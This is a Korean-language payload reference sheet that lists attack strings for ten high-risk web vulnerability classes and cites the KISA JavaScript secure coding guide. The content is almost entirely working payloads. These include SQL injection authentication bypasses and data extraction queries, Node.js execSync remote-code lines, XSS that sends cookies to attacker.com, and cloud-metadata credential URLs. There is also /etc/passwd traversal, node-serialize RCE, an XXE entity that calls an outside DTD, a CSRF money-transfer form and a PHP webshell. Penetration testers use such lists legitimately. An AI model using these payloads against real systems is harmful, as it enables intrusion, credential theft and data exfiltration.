# 취약점별 공격 페이로드 레퍼런스

KISA JavaScript 시큐어코딩 가이드 기반 CVSS 7.0+ 고위험 취약점 페이로드 모음

## 1. SQL Injection (CWE-89) - CVSS 9.8

### 인증 우회 (Auth Bypass)
```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
') OR ('1'='1
' OR 1=1#
' OR 'x'='x
1' OR '1'='1' /*
' OR ''='
```

### UNION 기반 데이터 추출
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
1' UNION SELECT ALL FROM users WHERE '1'='1
```

### 에러 기반 (Error Based)
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)--
```

### 시간 기반 Blind
```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### Boolean 기반 Blind
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(password,1,1))>97--
```

---

## 2. OS Command Injection (CWE-78) - CVSS 9.8

### 기본 명령어 삽입
```bash
; ls -la
| ls -la
`ls -la`
$(ls -la)
; cat /etc/passwd
| cat /etc/passwd
& whoami
&& whoami
|| whoami
```

### 인코딩 우회
```
%3Bls
%7Cls
%26whoami
${IFS}ls
;{ls,-la}
\nls\n
\r\nls\r\n
```

### Windows 명령어
```cmd
& dir
| dir
; dir
& type C:\Windows\System32\drivers\etc\hosts
| net user
& whoami /all
```

### 시간 기반 탐지
```bash
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1
```

---

## 3. Code Injection / Eval (CWE-94) - CVSS 9.8

### Node.js eval() 공격
```javascript
require("child_process").execSync("whoami").toString()
process.mainModule.require("child_process").execSync("id")
global.process.mainModule.require("child_process").execSync("ls")
this.constructor.constructor("return process")().mainModule.require("child_process").execSync("whoami")
```

### Function 생성자 공격
```javascript
new Function("return process.env")()
(function(){return this.constructor.constructor("return process.env")();})()
[].constructor.constructor("return process.env")()
```

### 템플릿 리터럴 공격
```javascript
${process.env}
${require("fs").readFileSync("/etc/passwd")}
${7*7}
```

---

## 4. XSS (CWE-79) - CVSS 7.1

### Reflected XSS
```html
<script>alert("XSS")</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))</script>
'-alert(1)-'
<iframe src="javascript:alert(1)">
```

### Stored XSS (쿠키 탈취)
```html
<script>fetch("http://attacker.com/?c="+document.cookie)</script>
<img src=x onerror="new Image().src='http://attacker.com/?c='+document.cookie">
<script>document.location="http://attacker.com/?c="+document.cookie</script>
```

### DOM XSS
```
#<script>alert(1)</script>
javascript:alert(document.cookie)
data:text/html,<script>alert(1)</script>
javascript:/*--></title></style></textarea></script><svg onload=alert(1)>//
```

### 필터 우회
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
<script/src=data:,alert(1)>
<svg/onload=alert(1)>
<img src=1 onerror&#x00;=alert(1)>
<%00script>alert(1)</script>
```

### 인코딩 우회
```
&lt;script&gt;alert(1)&lt;/script&gt;
\x3cscript\x3ealert(1)\x3c/script\x3e
\u003cscript\u003ealert(1)\u003c/script\u003e
%3Cscript%3Ealert(1)%3C/script%3E
```

---

## 5. SSRF (CWE-918) - CVSS 9.1

### 내부 네트워크 스캔
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

### 클라우드 메타데이터
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/
http://169.254.169.254/opc/v1/instance/
```

### 프로토콜 핸들러
```
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:11211/stats
gopher://127.0.0.1:6379/_INFO
ftp://127.0.0.1
```

### URL 우회
```
http://127.0.0.1.nip.io
http://127.1
http://0177.0.0.1
http://2130706433
http://0x7f.0x0.0x0.0x1
http://127.0.0.1%00.example.com
http://example.com@127.0.0.1
```

---

## 6. Path Traversal (CWE-22) - CVSS 7.5

### 기본 경로 조작
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

### Null 바이트 인젝션
```
../../../etc/passwd%00.jpg
../../../etc/passwd\x00.jpg
....//....//etc/passwd%00.png
```

### 인코딩 우회
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows/win.ini
%252e%252e%252f%252e%252e%252fetc/passwd
```

---

## 7. Insecure Deserialization (CWE-502) - CVSS 9.8

### Node.js node-serialize 공격
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('whoami')}()"}
{"rce":"_$$ND_FUNC$$_function(){return process.env}()"}
```

### Prototype Pollution
```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"__proto__":{"toString":"polluted"}}
{"__proto__":{"valueOf":"polluted"}}
```

### YAML 공격 (js-yaml)
```yaml
!!js/function "function(){return process.env}"
!!js/eval "process.exit()"
```

---

## 8. XXE (CWE-611) - CVSS 7.5

### 파일 읽기
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

### Blind XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
<foo>test</foo>
```

---

## 9. CSRF (CWE-352) - CVSS 8.0

### Form 기반 CSRF
```html
<form action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to" value="attacker" />
</form>
<script>document.forms[0].submit()</script>
```

### Image 기반 CSRF (GET)
```html
<img src="https://target.com/api/delete?id=1" />
```

### Fetch 기반 CSRF
```javascript
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({action: 'malicious'})
});
```

---

## 10. File Upload (CWE-434) - CVSS 9.8

### 웹쉘 파일명
```
shell.php
shell.php.jpg
shell.php%00.jpg
shell.pHp
shell.php5
shell.phtml
shell.asp
shell.aspx
shell.jsp
.htaccess
```

### 매직 바이트 우회
```
GIF89a<?php system($_GET["cmd"]); ?>
\xFF\xD8\xFF<?php system($_GET["cmd"]); ?>
```

### Content-Type 우회
```
filename: shell.php, Content-Type: image/jpeg
filename: shell.php, Content-Type: image/gif
filename: shell.php, Content-Type: image/png
```

---

## 참고 자료

- KISA JavaScript 시큐어코딩 가이드 (2023)
- OWASP Top 10 (2021)
- CWE/SANS Top 25
- PortSwigger Web Security Academy
